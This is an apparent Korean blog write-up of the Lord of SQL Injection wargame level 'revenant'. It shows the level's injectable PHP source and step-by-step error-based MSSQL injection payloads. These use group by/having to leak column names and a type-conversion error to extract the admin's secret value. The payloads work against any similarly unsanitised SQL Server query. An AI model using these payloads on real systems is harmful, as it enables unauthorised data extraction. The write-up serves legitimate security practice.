---
title: "[Lord of SQL Injection] LoS - revenant 문제풀이"
date: 2019-07-27
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

또 간만에 정리하는 Write-up이다.
이번에도 `MSSQL` 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select * from prob_revenant where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect();
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);
  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

  $query = "select * from prob_revenant where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['4'] === $_GET['pw']) solve("revenant"); // you have to pwn 5th column
  highlight_file(__FILE__);
?>
```

언뜻 보면 이 전 문제와 동일하게 생겼다.
그런데 이 번 문제의 핵심은 바로 `5 번째 열(column)`을 뽑아야 한다는 것이다.
그렇다면 먼저 5번째 컬럼 명을 알아낸 후, 이 전 문제와 같은 방법으로 오류를 유도하면 `5 번째 열`의 값을 알아낼 수 있을 것 같다.
테이블 내의 컬럼 명을 알기 위해서는 `group by`와 `having`을 사용했다.
이 전 문제에서 아래와 같이 입력하면 `테이블 명.컬럼 명`이 나타나는 오류를 확인할 수 있었다.  

```plain
?id=a' having 1=1 --
```

---

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.id' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

위의 오류 중 `prob_revenant.id`에서 `prob_revenant`는 문제의 `테이블 명`이고 `id`는 `컬럼 명`이다.
이를 활용하여 두 번째 컬럼 명을 구해야 하는데 이 때는 `group by`를 사용하면 된다.  

```plain
?id=a' group by id having 1=1 -- 
```

위의 값을 입력하면 완성되는 쿼리는 다음과 같다.  

```mysql
select * from prob_revenant where id='a' group by id having 1=1 --' and pw=''
```

따라서 `id='a' group by id having 1=1` 까지가 `where`절에 사용되고 뒤의 부분은 주석처리 된다.
그 결과 `having` 절에서 오류가 나며 `id` 다음 열을 알아낼 수 있다.  

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.pw' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

오류 안에서 두 번째 컬럼 명이 `pw`라는 것을 알 수 있었다.
다음 세 번째 컬럼 명을 알기 위해서는 `group by` 뒤에 두 번째 컬럼 명을 추가 해 주면 된다.  

```plain
?id=a' group by id,pw having 1=1 -- 
```

---

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.45a88487' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

세 번째 컬럼 명은 `45a88487`라는 것을 알 수 있다.
같은 방법으로 네 번째, 다섯 번째 컬럼 명을 알아낼 수 있다.
그런데 세 번째 컬럼 명은 시작 부분이 숫자라서 그냥 입력하면 오류가 난다.
그래서 `"`로 묶어주었다.  

```plain
?id=a' group by id,pw,"45a88487" having 1=1 -- 
```

---

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.13477a35' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

---

```plain
?id=a' group by id,pw,"45a88487","13477a35" having 1=1 -- 
```

---

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.9604b0c8' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
```

이렇게 다섯 번째 컬럼 명이 `9604b0c8`라는 것을 알 수 있었다.
이제 다섯 번째 컬렴 명에서 이 전 문제와 같이 오류를 발생시켜 값을 추출하면 문제를 풀 수 있을 것이다.
이를 위해 아래와 같이 공격 구문을 구성했다.  

```plain
?id=admin' and "9604b0c8"=1 -- 
```

그 결과 아래와 같은 오류를 얻을 수 있었다.  

```plain
Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'aa68a4b3fb327dee07f868450f7e1183' to data type int.
```

즉, `id='admin'`일 때 `다섯 번째 컬럼`의 값은 `aa68a4b3fb327dee07f868450f7e1183`라는 것을 알 수 있었다.  

이제 이를 `pw`의 값으로 입력 해 주면 문제를 풀 수 있다.  

```plain
?id=admin&pw=aa68a4b3fb327dee07f868450f7e1183
```

---

```php
---------------------------------------------------------------------------------------------------------------------------
query : select * from prob_revenant where id='admin' and pw='aa68a4b3fb327dee07f868450f7e1183'
---------------------------------------------------------------------------------------------------------------------------

REVENANT Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect();
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  sqlsrv_query($db,$query);
  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

  $query = "select * from prob_revenant where id='admin'"; 
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['4'] === $_GET['pw']) solve("revenant"); // you have to pwn 5th column
  highlight_file(__FILE__);
?>
```

---

```plain
REVENANT Clear!!
```